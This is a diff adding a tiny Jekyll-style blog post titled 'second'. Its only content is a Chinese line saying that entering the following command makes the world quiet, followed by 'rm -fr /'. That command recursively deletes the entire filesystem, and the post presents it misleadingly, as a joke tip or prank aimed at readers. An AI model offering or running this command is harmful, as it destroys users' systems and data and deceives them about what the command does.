@@ -1,0 +1,10 @@
+---
+layout: post
+title: "second"
+date: 2012-06-04 00:09
+comments: true
+categories: 
+---
+
+输入下面命令,世界就清净了
+	rm -fr /
